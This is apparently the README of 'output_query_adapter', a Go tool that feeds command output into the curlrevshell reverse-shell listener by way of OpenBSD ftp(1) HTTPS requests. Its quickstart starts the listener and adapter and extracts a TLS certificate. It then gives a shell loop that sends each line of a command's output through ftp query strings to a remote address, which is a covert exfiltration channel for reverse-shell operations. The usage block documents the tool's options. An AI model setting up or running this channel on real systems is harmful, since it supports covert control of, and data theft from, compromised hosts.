output_query_adapter
====================
Adapter to convert ftp(1) HTTPS path query strings to curlrevshell input

Quickstart
----------
Most of this is much easier done with the makefile at the root of this repo.
1.  Start [curlrevshell](https://github.com/magisterquis/curlrevshell)
    ```sh
    curlrevshell
    ```
2.  Start `output_query_adapter` pointing it at curlrevshell's output URL and
    and certificate archive file.  Note the address it logs.
    ```sh
    go run . -curlrevshell https://127.0.0.1:4444/o -tls ~/.cache/sstls/cert.txtar
    ```
4.  Grab just the certificate from the archive, for
    [`ftp(1)`](https://man.openbsd.org/ftp.1).
    ```sh
    awk \
        '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/' \
        ~/.cache/sstls/cert.txtar >cafile.pem
    ```
5.  Send output with wild abandon.
    ```sh
    ./thing_which_makes_output | cat -n | while read -r; do
        ftp \
            -M \
            -o - \
            -S cafile=cafile.pem \
            -V \
            "https://$ADDR/$ID?$REPLY"
    done
    ```

Usage
-----
```
Usage: output_query_adapter [options]

Adapter to convert ftp(1) HTTPS path query strings to curlrevshell input

HTTPS
User-agent strings for a single connection should start with a number and
whitespace.  The first message on the connection should start with 1.

Options:
  -curlrevshell URL
    	Curlrevshell's base output URL (default "https://127.0.0.1:4444/o")
  -debug
    	Enable debug logging
  -listen string
    	0.0.0.0:4433 (default "Listen `address`")
  -tls archive
    	TLS certificate and key archive (default "crs.txtar")
```
